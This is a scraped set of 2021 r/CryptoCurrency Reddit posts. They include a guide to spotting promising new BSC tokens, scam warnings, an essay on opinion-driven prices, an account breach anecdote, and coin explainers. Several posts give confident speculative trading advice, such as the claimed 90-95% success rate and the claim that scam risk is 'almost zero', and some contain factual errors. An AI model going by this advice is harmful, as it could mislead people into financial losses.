Not every new coin is a shitcoin: How to spot the real GEMS inside the sea of shitcoins.,"a few days ago, i made a post titled *""rugpulls and honeypots. what they are and how you can avoid them.""* since then i got a lot of messages from people asking me how they can tell the difference between a new coin with lots of potential and a shitcoin. for maximum protection, make sure you follow this guide in combination with the other guide. i will not repeat those rules here. if you don't follow the rules of the other guide as well, you will lose your money. before i start, some background: i trade small coins for a living. in the beginning, while learning, i fell for all the scams just like everyone else. but with every loss i learned something new and i'm now pretty good at it. yes, i have losses like everyone else, but usually i get out with very small losses compared to my gains. anyone here hating shitcoins, i agree with you. **i hate shitcoins too.** part of what i want to explain here however is that not every new coin is a shitcoin. every coin has to start with 0 holders. everyone has to start somewhere. and every solid project deserves a chance to grow. yes, the vast majority of new coins are shitcoins, but i want to help you tell the difference between the real gems and all the shitcoins. # the golden rules if you start looking for the real gems and want to trade smaller coins, **follow these rules or you will lose money**. 1. start trading on the bsc (binance) smart chain. why? transactions cost around $0.20 max. you can't do this on the eth chain where you spend lots on gas fees, sorry. i know they came down, but they're still too high. 2. for the first 1-2 months, don't invest more than $5 per coin. i am not joking. yes, your gains will not be thousands of dollars, but if you go in with more you will end up losing a lot of money, trust me. 3. have a small bag of maybe $150 or $200. be prepared to lose your small bag completely. if you can't afford this and sleep well at night, don't do it. **ready? let's start:** # find the coins go to the bscscan website (look up the links yourself, i don't want to link-spam this post). then, go to ""view bep-20 transfers"". if the list looks confusing, don't worry. look at the rightmost column that says ""tokens"". you must look for the grey icon besides the coin names. why? because that means the coin is new. established coins already have their icons listed and that means you're usually too late to make high gains. you can refresh that page for new coins every second, you will always find new ones. open the new coins (with the grey icon) in separate tabs and look at them. so, now you have found a coin, it's time to investigate. # 1. holders on the page you just opened, look at the ""holders"" list. the biggest holders of a coin should always be the liquidity pool which is usually identified as ""pancakeswap: coin name"" and the dead coins wallet, usually identified as ""0x000000000000000000000000000000000000dead"". why is this important? it reduces the possibility of a rugpull to almost zero, especially if the dead coins wallet is over 50%. also watch out if there are too many whales. for example, 10 wallets each holding 3% of total coins is a huge red flag. abort immediately. a healthy new coin should also have at least 200-300 holders. if it doesn't, also abort immediately. # 2. liquidity pool the liquidity pool is super important. i usually don't buy any new coin unless the liquidity pool is at least $30k or more. why? because scammers and shitcoins rarely provide a liquidity pool of that size. again, we're greatly reducing our risks here. a locked liquidity pool is also important. make sure it's locked for a longer period of time. 3 months, 6 months, 1 year or longer are great. you don't want the liquidity pool to unlock tomorrow. you can copy the contract id and then go to ""poocoin"" (again, look up the links yourself), then enter the contract url there, hit enter and on the next page on the left side it will show you something like ""coin/bnb lp bnb holdings:"". that's where you want at least $30k or more. if it has a few hundred dollars or even only $5k or $7k, abort immediately. # 3. volume look at the ""transfers"" section. if the coin has only 5 holders and no activity, skip it. if you want, bookmark it and come back to check tomorrow. you may have just been too early. if it has only a few transactions every 2-3 hours, also abort immediately. it's not taking off yet. a good number of transactions for a new coin should be about 5-10 per minute. # 4. website & twitter make sure the coin has a website and twitter account. if it doesn't have both of them, abort immediately. if it also has a reddit page, a telegram channel, a discord, an instagram page, a youtube channel, etc. that's even better. # 5. coin name & design the logo of the coin and the design of the graphics and website are very important. if it's not attractive, people will not jump in and it won't take off. if the use stock images that you've seen a hundred times elsewhere, abort immediately. the name is also super important. if it has a catchy name like ""save the world"" it's much more likely to take off than ""funky toilet coin 55"". # 6. bonus: doxxed team this one is a huge bonus. if the team members publicly identify themselves, for example through youtube videos or live ama, it reduces the chance of a scam to almost zero. why? because their faces and identities are publicly known and they would almost certainly end up in prison. # that's it! did the coin you investigated fail in any of the first 5 steps? i cannot stress this enough, but: abort immediately. don't invest in it. you will end up losing your money. did the coin pass all of the above steps? great! you ***might*** have found a gem. do some more research before you jump in and make sure the coin has a real purpose. remember, things like hodling to get more coins or ""to the moon!"" are not real purposes. and now we go back to the golden rules. if you are ready to invest in this coin, **remember to only invest $5 for the first 1-2 months** of doing this. i cannot stress this enough. you are learning and you will make mistakes. make sure you are okay with losing that money because even if a coin matches all of the above, it can still fail for a variety of reasons. if you stick to this rule, you can still make a good amount of money in these 1-2 months. i easily made $10 to $50 with just $5. sometimes i got out at $3.50 because a coin didn't take off and re-invested elsewhere. once you've done the above for 1-2 months and you've noticed any potential mistakes you made, you should be ready to start trading with $10 or $20 per coin (depending on your financial situation). two more important things to remember: 1. early coins take time to take off. it's very possible that your $5 investment will drop to $3 or $2 in that time and go up to $10 and then go back down to $4. it may just sit there doing nothing for 5-14 days. that's absolutely normal. 2. keep track of what the team is doing during this time. if there are no updates for 2-3 days, sell and get out. a good team should update its holders several times per day through several channels (twitter, discord, telegram, etc). it's okay to get only 1 update per day, but less than that is a red flag. i **always** follow the above rules when trading with small coins and i currently have success with 90-95% of coins that i invest in. trust me, **i tried to skip some of the rules above and i got burned every time**. yes, it's a lot of work. especially if you have to repeat these steps for every single coin you want to investigate, but you will get much faster at it over time. if you end up doing this for a living, you will probably be able to investigate 2-3 coins per minute. now, if you excuse me, i need a coffee and relax my fingers a bit. they hurt :p",20346,2475,0.88,2021-05-10 14:29:24,web3,CryptoCurrency,hazelvelvet,False,13206.4

"If someone is screaming ""Hold The Line"" they really mean ""Prop up the price so I can get out too""","as the title really. if someone is screaming at you and calling you out for selling they are not doing this because they are worried about your gains. they are worried about their own, they bought high and need the price up to recoup their losses. someone in profit quietly takes their gains and walks away, or quietly rides it out. someone who believes in the project will ride it out too, they will understand you taking profits, they will be confident someone else will buy in. they will generally behave in an encouraging manner. people doing the shouting are usually bag holders, this all may be obvious to most of you, but for some, particularly when it is ""your coin"" it is hard to see. take a step back and look objectively at it as if it were another coin, think about how you would feel looking from the outside. a community that berates you for selling when you want to is toxic and should be a red flag. take care out there people",20317,1527,0.84,2021-05-09 12:03:05,web3,CryptoCurrency,Alternative-Pipe-558,False,12809.399999999998
I made a post about the scam OpisHub yesterday. The scammers didn't like that and bought downvotes to make my post invisible. So this is an even more detailed post about them.,"yesterday i made [a post](https://old.reddit.com/r/cryptocurrency/comments/o6zy0e/scam_warning_if_you_see_posts_praising_opishub_on/) about opishub. it's still up, but the main point was that they approached me to shill their shitcoin for money and that they are really shady, it has many red flags and very much looks like a scam. then one of the scammers (scammer 2) sent me a message that he didn't like it, and that i was deleting his comments on my post (lol he has less than 50 comment karma, they just got deleted, of course i didn't do anything). my post only had like 35 or 50 upvotes at this point and it had already been 2 hours since i posted, the post wouldn't have become very big - but the scammers decided to buy downvotes, bringing it to below 0 within minutes, [see also here](https://old.reddit.com/r/cryptocurrency/comments/o75scd/the_scammers_behind_opishub_didnt_like_the_post_i/h2wxc7e/). the mods deleted a post about this that i made yesterday (because it broke another rule, so i understand - but that post is probably also the reason why my original post is above 0 again), so here i go again: these guys are obviously shady, some examples: * one of them (the one that originally approached me, scammer 1), [pretended to have just stumbled across the project](https://old.reddit.com/r/beermoneyuk/comments/n15mwk/passive_phone_gains_opishub/) instead of saying that he was part of the project **edit:** just saw that the post was deleted, it's archived [here](https://web.archive.org/web/20210429143341/https://old.reddit.com/r/beermoneyuk/comments/n15mwk/passive_phone_gains_opishub/) * they wanted to pay me (and most likely others) to shill their project * they [openly told me](https://imgur.com/a/rgw1hsb) they would do vote manipulation and upvote my posts about them and then, well, bought downvotes so even if the coin would not be a total scam - which i really think it is - they are obviously doing shady stuff. i have already listed the obvious red flags that make them look like your average scam coin, here they are again, slightly adapted: * they use your phone's cpu for mining * the cpu is used to power scientific research (of course they don't say what ""scientific research"" they are talking about anywhere). and i work in science: of course i would rather use the cpu of a few phones than, well, the powerful computers we have, just as much as i would rather ride a few cats that are tied together than a horse * ""each transaction gives a small % to charity"" * they plan to be super eco friendly and plant trees * ""our primary promotional point is that it adds people's incentive to get their friends and family on board , therefore we will have a reffer@l scheme in place"", so it's officially a pyramid scheme * the token (and app) will launch soon ™ scammer 1 had also told me they ""have received £3.5million pounds in the last week to utilise to get this project off the ground"". if you look at their social media activity etc., it's all extremely basic and unprofessional (but check out their twitter, it's kind of funny - they really try to seem ""sciency"" but don't really know anything about science i think. the followers are either also bought or baited by some fake giveaways, very few seem to be normal, non-spammy accounts) - no company with multiple millions funding would present themselves like that. also look at the [start of the email](https://imgur.com/a/tbq5yz9) they sent me in beautiful red, scammer 1 didn't even remove the ""initial contact"", which i think is hilarious. so again, if you see positive posts about this project, it's either the scammers or people with less morals that they approached. stay away from them as far as possible, at least don't give them money, your personal information, or go to their website/ download their app so they can send you viruses.",20895,600,0.93,2021-06-25 05:06:59,web3,CryptoCurrency,_martinshkreli_,False,12786.3

[this all used to be a useless lawn.](https://youtu.be/u79bql-jsqi) [bored for a night? go watch ""sustainable"" on netflix.](https://sustainablefoodfilm.com/) look into people like [geoff lawton](http://www.geofflawtononline.com/), mark shepard, sepp holzer, these people are going to save us. want to make a small change yourself? grow a tomato plant on your balcony in a pot. reduce transport of the tomatoes you eat, and make ~$50 per plant in saved money. want to do something bigger? plant a fruit tree in your backyard. maybe two. maybe a raspberry bush. you are now part of saving the human race. if everyone reading this planted a fruit tree, or even some wild flowers, we could save the bees. while you are at it, planting a fruit tree has been shown to be one of the best investments on the planet. there's pretty much no investment on the planet that is more financially lucrative (while still being nearly bullet-proof safe) than planting a fruit tree. you can get a tree at an end of sale auction for literally 5-10 bucks, and that tree will produce thousands of dollars of fruit for you in it's lifetime. go spend $200 bucks at an end of season sale, plant 10-20 trees (if you have room), and that $200 will be worth tens of thousands of dollars of saved money. do it right, [set it up right and it's almost no work](https://youtu.be/bjblvso0zey) because you offload the work to nature - as it has done for the last few billion years. go learn how, let me show you how. if you do it right, it's zero work after you have planted and wood-chipped, and all you do is pull dollars off a tree. _______________________________________________________ original post starts below. i apologize for the shilling of permaculture, but i think loss of topsoil will impact us all if we don't reverse it soon. we need soil, we need bees, we need food. we need to stop buying december bananas in canada. we need to start supporting local permaculture sustainable farms. we need to do this or we may not make it, and our grandkids stand no chance. ______________________________________________________________________ **i also expended the ""now what happens"" section, to explain how these pullbacks are a good thing, make crypto more stable, and why we keep seeing larger ceilings after every pullback... this stuff is really important for you to make money on this thing, if that's your goal....** i've made a similar post in a few spots, and this is something that is absolutely critical for people to understand... what impacts price, and what is going on lately. price has only a very minor correlation with money invested, and a major correlation with opinion. ... and humans are an emotional bunch. so what drives price of any commodity, crypto, gold, pizzas, whatever? the money invested in it, right? kind of, but not really. what if i told you that you could theoretically raise bitcoin from $15k to $20k by spending $1, and lower it from $25k to $1k by spending the same $1? crazy right? **an example** this is going to start out slow, i want to make sure i get everyone on the same page before i pick things up and lift the curtain. stick with me here.... this is an example to help illustrate why prices aren't driven by money invested, but rather consensus and opinion. lets imagine the following exists (we will use bitcoin as an example, but this is how everything on the planet works) lets say bitcoin is currently priced at $10k (the last sale). from $11k to $99k, every $1k there is someone with a sell order of 1 full bitcoin. from $9k to $1 dollar, every $1k on the way down there is someone with a buy order of 1 full bitcoin. so, right now if you wanted to buy bitcoin you have several options... meet the lowest seller's price of $11k, or, put your own buy order up, above the highest buyer's bid order (overcut them). if you decide to just place an order, the price doesn't change. if you decide the buy the $11k bitcoin, now bitcoins value is $11k, with a new lowest sell offer of $12k, and a highest buy bid of $10k. someone else comes in an overcuts the buy bid and puts 1 btc for sale for $11k. no trades are made until someone matches a buy/sell. okay, that's kindergarten stuff, most people here understand that. so how much money drove the price up in this situation? $11k, and btc price raised 11/10, 1.10, or 10% from the last sale. now the entire marketcap of btc raised 10% (last sale multiplied by circulating supply). so it takes $11k to drive a 10% increase, right? not at all. lets look at what happens when news is released. news comes out that warren buffet thinks bitcoin is a scam, a bubble, and he wouldn't touch it with a 10 foot pole because he only invests in things he understands and he doesn't understand crypto. people panic everywhere, and believe ""this guy is smart, i'm overvaluing this thing"". suddenly people don't want to buy this scam anymore, and the buy orders for $11k, $10, and $9k are taken down. at the same time, the people wanting to sell start to panic and just want out. the guy at $32k (who just had that offer up ""just incase it moons"") drops down to $11k sell order. the guy at $12k, who was the lowest, now undercuts him to $10k. the other buyers see the sellers undercutting and think that if these people want out, why am i buying in. the $8k guy pulls his offer, and so do the $7k, $6k and $5k guys. the highest offer is now $4k. the sellers panic further and the $14k guy undercuts the $10k guy and puts up a $9k sell. the $15k, 17k and 11k guys all see this flurry of panic and now a storm undercutting is triggered, to $8k, $7k, and $6k. the $8k order pulls his again and goes down to $5k. the price on the buy and sell orders has moved around a ton, but no sales have actually happened yet. technically, btc is still ""worth"" $11k, and the market cap reflects that. all this horseshit has happened, and it only happened in 10 seconds, but the price hasn't moved yet. the $27k guy wakes up and checks his phone. he had a $27k offer just incase the price moved also, and he also only has a tiny infinitesimal fraction of a btc. well, he decides ""he's out"" and fills $1 worth of the part of the $4k guys buy offer. the latest price information is now updated, and btc fell from $11k to $4k price per btc with the movement of a single dollar. this is exaggerated example, but this is what moves price. not money in vs money out. the only thing that moves price is perception. **opinion flow and not money flow** now the above example only happens if everyone simultaneously believe the same thing... this the asset they are holding is a steaming turd. what happens in reality is there's no black and white, it's shades of gray. it's flow in vs flow out. but again, not flow money, but rather opinions. if 66% of the holders of something all of a sudden unanimously decide that their asset is overvalued, then they panic sell. even if 33% of the people decide they are going to buy up as much as these panic sellers sell, if the panic is strong enough, and they are slitting eachother's throat to sell, then the buyers just happily sit and let them do that, and time their buys in. very little money has to actually change hands in order for this price to crash, all that matters is the flow of opinion has to be swift and violent, and in majority. the sellers will leapfrog eachother on the way down, faster than the buyers scoop up their sales, and the net result is a crashed price. note, this happens both ways... fear, uncertainty and doubt (fud) as well as overhyped fomo (fear of missing out). **so now what happens?** time goes by and all holders opinions of their asset hasn't changed. they still think it's worth $11k and they got great deals scooping up what these sellers were selling. the weak hands have left the market and have been replaced with holders. overall, now a higher percentage of holders believe in the product they are holding and are unwilling to sell for the panic prices of the last week. panic sellers were also replaced by new money, people who have wanted in for a while and are now in on their perceived ground floor. also, people who bought btc at $1 ten years ago and have been looking for an exit to cash profits have now been replaced by either long term holders, or by these new people who are thrilled to have finally entered, and they are looking to hold long. so what happens on pullbacks? the number of people waiting to jump off the ship has decreased. the new ground floor is established. are we done? who knows, this could go on for another year, but what matters is that people who want off are getting off and people that want on are getting on. people who have panic sold and never believed in this in the firstplace... people who have wanted out for 10 years... they have been replaced by people who are now getting in on their ground floor, and are going to be holding long. the market is suddenly increasingly more stable today than it was yesterday, even though prices are down. **this is a good thing.** this is why crypto keeps bouncing back from pullbacks and reaches new higher ceilings and floors each time. old money who wanted out, and new panic holders, they are gone. they are replaced with adopters, holders, believers in this technology. these people aren't selling anytime soon, because they believe that this thing is going to revolutionize the world. every crash brings more of these people in, and removes more panic sellers out. **moving forward** now news releases start coming out about how stock etfs are being created, nasdaq index funds, bank support, government support. companies are using this tech, and companies who use blockchain for transportation are putting non-blockchain companies out of business. the people on the outside looking-in feel they are missing out. they now start coming in and buying. they start overpricing eachother on their buy orders, and eventually it gets close enough to a sell order that someone decides they are just going to meet the sell price. the sale goes through. sellers (hodlers) see this action, and they start pulling sell orders off the table almost as fast as they fill. sure some trades go through, and incoming money is driving the price up as market orders are filled. but what's also happening is people are seeing this flurry of volume, and sellers are pulling sell orders and placing them higher. junk coins and pump and dump scam coins are dying by the millions. in their ashes, good solid technology projects whose coins have fundamental economic reasons for growth, these are rising. corporate partnerships continue forming. the real world continues to create actual use cases. companies start storing more and more corporate information on blockchain. public companies use blockchain to store scientific research (see canadian research council announcements), and blockchain acts as a library of alexandria. people can travel out of country without any monetary exchange, using their chosen cryptocurrency to buy the things they need abroad. the world is slowly actually using this technology. money is coming in, but more importantly, opinion is changing. literally nothing could have happened in terms of fundamentals, partnerships, etc... this can all be driven entirely emotional, so long as it's wide-spread and strong. infact, the market could theoretically rebound in this way from $4000/btc to $1 million per bitcoin by the sale of one penny. $4000 sound low? does that number make you uncomfortable? we may go that low. we may not. if we do, i'm not panicking and selling, i'm buying more. **so what has happened in the last few months? and where are we going?** a lot of new money has come in from nov-jan, and they don't really know what they are investing in. sure some of them have done great research and are smart investors but most people aren't and isntead they are buying symbols and names and trading on speculation. they are treating their favorite coins like a sports team, and will follow them irrationally off a cliff. these new people came in and invested in cryptocurrency because their opinion was heavily influenced in nov, dec, jan, from media. they saw this money making machine called crypto. they were willing to pay huge, ride the wave up, keep buying, etc. they were ""ground floor adopters"" and were going to get rich. they outnumber the old money by a lot. their opinion matters. it matters the most. to keep this in perspective, they are also a vast minority of ""new money"" that will enter the game in the next decade. this cycle will continue over and over and over. their opinion rose nearly unbounded and price rose accordingly. market cap rose from 10b to 750b, and it could have been very little actual money that did this. how much did it need to be though? literally one penny, theoretically. all that matters in moving price is momentum of opinion. i believe it has been estimated that as low as 6b usd was responsible for the bull rush. these people then started hearing ""bubble"", ""scam"", fake news about governments banning. they don't understand how technology wins, always. crypto is beyond government control. if they could have stopped bitcoin they would have done it already. **who is driving all this?** most investment opportunities go first to ""accredited investors"". you need to have multimillions in order to get in on the ground floor for most stock ipos, and we're seeing that start to happen with coin icos. bitcoin was a joke for the first few years, while lunatics picked it up. at this point, it was really too late to get in ""early"", and who would have wanted to anyways, it was all still a joke. so wallstreet, banks, governments have generally watched on the sidelines as average joes who were crazy enough to be early adopters and toss $100 on fake internet money slowly became millionaires. not only that, but the idea of blockchain started to become understood. the power and value in it became understood. not only as a way to track ""monetary value"" but for many other applications as well. platforms were created, business uses brainstormed, products started being made. this thing started taking off, and wasn't a joke anymore. but regardless, big money wasn't in on the ground floor. they have stakeholders opinions to think of, and what do they say to investors when they lose all their money on magic internet points? but they have woken up now. this thing has ""popped"" many times now and keeps recovering. this thing won't die. could they have been wrong all along? if they want in, how do they get in? they are no dummies, they have been controlling the world their whole lives? look at the media experiment that trump is doing? he is testing just how we work... you can do literally anything and we remember it for like 30 seconds, until the next news story comes out. we change opinions very easily. we are swayed very easily. we are their puppets. media controls the world. they know their way in. they have one weapon against cryptocurrency. your opinion of it. and they know it. **media.** that's why fud is so powerful and needs to be respected. it's why we need to read more than titles on news articles. we need to question what we read, **whether it's good news or bad news**. we need to think about ""what are the motives of the person saying this to me"". does the government have a conflict of interest when they state that crypto is gambling? do they have skin in the game? what about wall street? does weiss ratings possibly have incentive to come out with poor ratings? do banks have incentive to lock accounts in order to ""protect"" customers from ""unsafe investments"" when their entire business model revolves around holding as much of your money as possible and making money off it? do you think banks have any super secret hidden interest in preventing you from storing your money elsewhere? i'm not sure, maybe you can critically think about that. just understand that this goes both ways. when crypto is booming and fox news is showing people how to buy $4 ripple on prime time, you may want to start putting in some stop loss orders. when the suicide hotline is stickied at the top of /r/cryptocurrency and everyone is panic selling, you may want to start picking up some firesale deals. so, the question is this... is crypto undervalued or overvalued at it's price today? where is the price going long term? **i'm not talking about it's use case**, i'm talking about in the **court of public opinion**, where is that going? because that is what is going to drive price in the future. without a crystal ball, this is of course impossible to know. do your own research and form your own opinion. it could very well be that the technology having a use-case will in and of itself drive opinion, and thus price. but make sure you understand that it's not the technology itself, it's not the value of the business itself, it's not the use case itself that will drive price, it is the publics opinion of that thing which drives price. they are intertwined, but they are not the same thing. tldr: very very little money has to move around in order to swing prices drastically, up or down. money in and out doesn't drive price, opinion does. how do you let the news you read impact your opinion?how are you being played (on both sides, shilling and fud). something is only worth what people think it's worth. often that's based on reality, value, business, money, but often it's entirely emotional.

Pornhub just saved a lot of my crypto,"so about 20 minutes ago, i got a ""hey, did you fly to germany overnight?"" unauthorized login email from pornhub. checked it, sure enough someone logged in with my password. don't give two shits about someone watching porn on my account, so i immediately went to work on the rest. i don't share passwords with any accounts, but pornhub one was an oddly secure password that probably couldn't be brute forced... i assumed breach. changed all my exchange passwords that were tied to the same email, and switched all their 2fa to my phone instead of email. that's when i start getting login failure notices... of course they hit the exchanges first. after that i damage controlled financial institution accounts, and sure enough started seeing login failures on those. about 15 minutes after i got the pornhub notice (when serious damage would've already been done) i got a ""possible breach"" notification from capital one assistant. i totally am usually asleep right now. pornhub may have just saved me tens of thousands of dollars, and is apparently more reliable than all my financial institutions. ****update and faq: thanks so much for the awards and responses! i just thought this was a funny near miss and wanted to share my maniacal laughter, had no idea it would blow up like this. so, turns out it was my phone that was malware compromised. factory reset, extended authy to everything for now, all passwords changed, all financial institutions alerted. as has been pointed out a few times in comments, it's likely they accessed pornhub first because if i had linked crypto wallets or bank accounts for tipping, they could just send all meh money to their verified account. probably a super easy front door way of scooping a couple btc up from unwitting peoples... hadn't thought of that, i just assumed they were testing access. no, having a pornhub account doesn't mean i pay for porn, just that i like to save playlists and favorites. some of you are living in the 90s of internet porn. amazed at how many people assume that the breach came from pornhub. frankly, it seems like they guard info better than anyone else i deal with. i would never think of putting personal information into any porn site... pornhub's app has always proven to be secure and well supported. all credit accounts frozen, all financial institutions contacted. net loss of zero. they attempted a $7000 wire transfer out of my checking account that my small town bank ofc called me about, and a $1300 credit card purchase that got declined as sketch. otherwise it seems i beat them to all accounts. ****edit 2: since so many people are asking about my phone... it's an android, brand new motorola sealed in box. no, i don't know the source, just know that it happened in a 2 hour window before i got all my security up and running, during which time i used it for work a lot and downloaded a lot of my standard programs. i just ran my basic security check, and thing came up red af, so i didn't even bother trying to treat... i only have had it for a week, reset was easy.",18711,1797,0.9,2021-06-10 10:04:59,web3,CryptoCurrency,ObscureOP,False,11954.4

Bill Gates said “The way cryptocurrency works today allows for certain criminal activities. It’d be good to get rid of that”. Crypto was not used to launder money according to Pandora papers. Its time for these people to swallow their words and be critical of traditional finance and the government.,"pandora papers showed that people are using loopholes in tax laws to hide their wealth in tax havens to hide their wealth or ill gotten gains. they are not using cryptocurrency to do that, there are plenty of loopholes in tax laws for doing it legally. the rich are holding properties and investments under a network of offshore companies that are set up in other countries, or ""offshore"". these offshore countries or territories are where: \- it's easy to set up companies \- there are laws that make it difficult to identify owners of companies \- there is low or no corporation tax. the best part of it is that using tax havens to dodge taxes is not illegal. loopholes in the law allow people to legally avoid paying some taxes by moving their money or setting up companies in tax havens, but it is often seen as unethical. its estimated that from $5.6 trillion to $32 trillion is hidden in tax havens, according to the icij. the imf has said the use of tax havens costs governments worldwide up to $600bn in lost taxes each year. to hide money all you need to do set up a shell company in one of the countries or jurisdictions with high levels of secrecy. this is a company that exists in name only, with no staff or office. it costs money though. specialist firms are paid to set up and run shell companies on your behalf. these firms can provide an address and names of paid directors, therefore leaving no trail of who is ultimately behind the business. when such a huge amount of money is hidden in offshore havens, the rich still blames cryptocurrency as the culprit for money laundering. this is classic gaslighting. they are projecting and blaming the most vulnerable group, what they do themselves. this legal way of tax dodging will never end because the people that could end the secrecy offshore are themselves benefiting from it. so there's no incentive for them to end it. its time more people speak up against this and move more towards cryptocurrency where all data is independently verifiable. edit 1: it was a mistake on my part to say crypto is not used for money laundering. i saw that bill gates mentioned cryptocurrency as an innovation that the world can do without because it is sometimes used for criminal activities and with the current pandora papers leak where the ultra rich was dodging taxes using tax havens and trusts and thought , here is a guy doing borderline unethical things to dodge taxes and is bad mouthing a nascent technology because it is used for criminal activities by a small section of people taking advantage of its use cases. he was saying the world doesn't need crypto without seeing it's far reaching positive sides. i thought if a few criminal activities makes him think that crypto should be stopped, why doesn't he say the same thing about the banks, law firms and other institutions that promote, support and enrich from tax dodging. that's why i made the post. i am sorry i made the mistake in the headline, it was unintentional. i didn't expect the post will blow up or will be seen by more than a couple of people. sorry again.",16602,2208,0.74,2021-10-05 06:19:05,web3,CryptoCurrency,That-Attitude6308,False,10851.8

Will DOGE be worth $100 a coin? Can it become as big as ETH? Could Stellar Lumens be worth $1000 a coin? Will Safemoon make me rich?? We all need to look at total supply vs market cap to manage our expectations and be more logical about what is possible.,"the answer to all of those lofty expectations? impossible. this is a mistake a lot of people are making. you have to look at total supply and multiply it by price per coin to get the market cap. let’s look at a few popular ones… bitcoin is rare like gold, difficult to mine like gold and is used as a store of value like gold. as it becomes more scarce, it will continue to rise in price. it has a total supply of 21 million, of which 18 million are already circulating. after the 21 million are mined, there will be no more available. 18 million x $57k means it has a market cap of over a trillion dollars. that is huge. the total market cap for all crypto is 2.38 trillion. bitcoin is king. bigger than visa and mastercard combined. bigger than nearly every world bank. it is the world’s 3rd largest currency. ethereum has a total supply of 115 million. more coins than bitcoin. at the moment, it allows for 18 million to be mined each year max. in july, they are making a change with the london hardfork, eip 1559, and every time a transaction is made with eth, the eth fees will be burned, making the supply more limited and much more valuable, similar to btc. many are saying that eth will go up to $10k per coin this year because of these changes. when eth 2.0 is released next year, the price will probably go much higher. with 115 million in circulation, eth has a market cap of $400 billion. that’s worth more than all of walmart. so, it is really important to check the coin supply and then multiply that by the price you wish it would go to to make you rich. see if the amount seems realistic or not. let’s look at doge. doge has a total supply of 127 billion coins and a max of 10,000 are mined each day [edit: doge mints 10,000 coins every *minute*, not every day!]. that’s an additional 5 billion coins each year. if you multiply 127 billion coins the $100 you wish it were per coin, it would have a market cap of $12.7 trillion dollars. there is $37 trillion dollars in the world. is doge worth 1/3 of all the money in the world? the entire economy of the united states is $25.3 trillion. is it realistic to say a meme coin is worth roughly half the us economy…the largest economy in the world? let’s take a look at stellar lumens. the max supply is $50 billion. the supply increase is 500 million a year, which alone is 23 times the total amount of btc each year. anyway, if it were $1000 per coin, the total market cap would be $50 trillion, more than double the us economy. at the very most, maybe they could be $10 each? i say it could be worth $10 because it has actual utility. i think doge would top out at $1, and that would be pretty crazy. if doge were worth as much as eth, which i’ve seen people on the doge subreddit think might happen, doge would be worth a modest $388,720,000,000,000. $388 trillion. that’s at least 3 times all the money in the world economy, if google serves me right. then you have to be really careful of coins that are just a rug pull and get promoted on tik-tok, like safemoon. i don’t even need to do the math on safemoon to know it’s a scam. they will get people to throw all their money into it and then they cash out their supply and take everyone’s money. the total supply for safemoon is 1 quadrillion coins!!! stay away from that. insanity. look at supply of successful coins beyond btc and eth and see if you think they could be worth a lot more in the future. here are some i think worth investing in: polkadot (dot): total supply: 935.5 million, total supply 1 billion chainlink (link): total supply: 419 million, max 1 billion cardano (ada): total supply: 45 billion. this coin has many great uses, but will not be worth as much as others simply because of the number of circulating coins. maybe $10-$12 a coin max? but it is under $2 right now. atom: total supply: 248 million. new coins are created each year as rewards for people that hold (stake) atom. if you can find a good coin that gives you apr, many are 5-6%…much better than a traditional savings account! algorand (algo): 2.96 billion, also releases new coins as rewards to people that hold algo. tezos (xtz), circulating supply: 756 million. total supply: 763 million. mana: this coin is only used for a video game called decentraland. atari is making a casino opening in may in that virtual world. supply available: 1.5 billion. total supply: 2.6 billion. polygon (matic): 10 billion, half in circulation. because there is a max supply of 10 billion, if it grew to the size of eth…which won’t happen…each coin would be worth $35 a coin (take the market cap of eth and divide it by the supply of matic to see what it would be if it were as huge as eth). it’s under a dollar now. maybe it could grow to 1/4 of eth if we’re being optimistic? that would put it at $8.75 a coin. enjin (enj) 1 billion coins max, 834 million circulating. the list goes on, i just picked a handful of random coins i hear mentioned a lot, but all you need to do to check out what a realistic expectation for a coin is is to take the current supply of tokens, multiply it by what you wish the coin was worth and compare the market cap to btc or eth’s market cap, over a trillion and $400 billion, respectively. i don’t expect any alt coin to be worth as much as those those two. and, it bears repeating, the entire cryptocurrency market is worth 2.38 trillion. if you calculate that your coin at $100 is going to be worth double, triple, or quadruple that, i’d say that’s an impossibility. likewise, you can do the math the other way to see what your coin would be worth per coin if it were as big as eth or btc by simply dividing the market cap for eth or btc by the number of coins circulating for your prospective coin. your coin won’t grow as big as those two, but it’s a good way to visualize it and manage your expectations. (note that some of my supply numbers might be off a little, but they should be in the general ballpark)",15386,3145,0.82,2021-05-05 22:01:00,web3,CryptoCurrency,lunargrover,False,10497.800000000001

"For the newcomers: the top 50 Cryptocurrencies, each explained with one sentence.","i tried summing up the top 50 coins in 1 or 2 sentences. it is not perfect and you obviously shouldn't make any decision based on this list, but hopefully it will help newcomers find some projects they're interested in and understanding a little bit better this technology. if something is wrong or misleading, feel free to comment and i'll edit the post. obviously in 2 sentences is hard to describe the whole project idea, but i tried my best. &#x200b; 1. **bitcoin (btc):** the original. according to the creator (or creators?) satoshi nakamoto, it was created to allow “online payments to be sent directly from one party to another without going through a financial institution.” 2. **ethereum (eth):** ethereum is the wonder child of crypto, acts as an infrastructure for most decentralized applications. introduces smart contracts, which are like programs with specific procedures that, once deployed, no one can change. 3. **tether (usdt):** a centralized stablecoin tied to the dollar (so elon, please don’t try to pump it) 4. **polkadot (dot):** open-source protocol aimed at connecting all different blockchains and allowing them to work together, allowing transfers of any data. 5. **cardano (ada):** another blockchain, trying to improve scalability, interoperability and sustainability of cryptocurrencies. those who hold the cryptocurrency have the right to vote on any proposed changes in the software. 6. **ripple (xrp):** centralized coin, most people don’t see a future for it after sec went after it. 7. **binance coin (bnb)**: coin associated with the binance exchange, so valuable since it is the most popular centralized exchange. 8. **litecoin (ltc):** bitcoin’s cousin, with faster transactions and lower fees. 9. **chainlink (link):** the main idea is to link smart contracts with real-world data, verifying that this data is correct. 10. **dogecoin (doge):** wow, such high ranking! (okay, now please let’s get stellar back in the top 10). 11. **bitcoin cash (bch):** fork of bitcoin (so a copy with some differences), which tries to lower transaction fees and increase scalability but has been surpassed technology-wise by many other coins aiming to do just the same. 12. **stellar (xlm):** talking about currencies, xlm is one of the coins aiming to do just that, with fast processing times and low fees. it has also already become a stablecoin! (i’m kidding). 13. **usd coin (usdc):** another centralized stablecoin tied to the dollar, like usdt. 14. **aave (aave):** take a bank and make it decentralized, where the liquidity comes from the users and they earn fees from borrows. this is aave. 15. **uniswap (uni):** another defi like aave, but this time it’s an exchange like binance, just decentralized. 16. **wrapped bitcoin (wbtc):** it’s just bitcoin wrapped in ethereum to be used in defi applications. 17. **bitcoin sv (bsv)\*:** bitcoin scam variant 18. **eos (eos):** another blockchain, aimed at being highly scalable for

